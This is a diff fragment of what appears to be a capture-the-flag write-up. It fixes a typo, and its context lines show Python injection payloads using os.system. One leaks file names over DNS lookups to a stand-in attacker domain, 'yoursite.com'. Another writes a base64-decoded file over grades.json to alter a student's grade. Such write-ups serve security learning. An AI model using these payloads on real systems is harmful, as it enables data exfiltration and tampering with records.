@@ -34,7 +34,7 @@ __import__('os').system('for i in $(ls data) ; do host \"$i.yoursite.com\"; done
 ```
 
 
-Them edit gardes.json so Vincent's grade is over 90% :
+Then edit gardes.json so Vincent's grade is over 90% :
 
 ```
 __import__('os').system('echo "ewogICAgIlZpbmNlbnQiOiAyNy44NywKICAgICJDYXJsb3MiOiA4Ny42NywKICAgICJXaWVuZXIiOiA2MS44NiwKICAgICJuZXJkIjogMTAwLjAxCn0=" | base64 -d > data/grades.json')
